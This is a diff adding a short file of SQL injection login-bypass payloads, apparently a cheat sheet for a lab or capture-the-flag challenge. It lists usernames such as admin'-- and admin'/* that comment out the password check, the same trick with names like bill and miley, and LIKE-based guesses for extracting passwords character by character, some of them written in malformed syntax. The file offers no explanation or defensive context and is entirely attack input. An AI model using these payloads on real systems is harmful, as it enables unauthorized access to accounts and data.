@@ -1,0 +1,13 @@
+username: admin'-- or admin'/*
+
+username: admin
+password: 'or like username '(a%,b%,c%,d% etc..)
+
+username: bill'--
+
+username: miley'--
+
+username: bart'--
+
+username: admin
+password: 'or like password '(a%,b%,c%,d% ect..)
